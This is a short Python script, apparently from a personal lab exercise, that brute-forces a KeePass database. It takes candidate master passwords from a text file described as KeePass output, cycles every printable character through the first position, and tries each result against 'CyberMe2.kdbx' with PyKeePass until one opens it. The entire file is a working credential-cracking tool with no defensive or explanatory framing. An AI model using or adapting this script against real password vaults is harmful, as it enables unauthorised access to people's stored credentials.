from pykeepass import PyKeePass
import string

# Every possible character possible, used to brute force login
all_possible_characters = string.ascii_letters + string.digits + string.punctuation
# Get .txt file from keepass output to iterate through each of the options
passwords_found = []
with open(r'/home/cyberme/Downloads/testkeepass/test.txt', "r") as file:
    content = file.read()
passwordfound = False
passwords_found = content.split(',')
for p in passwords_found:
    login_password = list(p)
    for character in all_possible_characters:
        login_password[0] = character
        brutepass = ''.join(login_password)
        #print(brutepass)
        try:
            kp = PyKeePass('CyberMe2.kdbx',password=brutepass)
            print(brutepass)
            passwordfound = True
        except:
            continue
        if(passwordfound == True):
            exit()
if(passwordfound != True):
    print('Password Not Found')


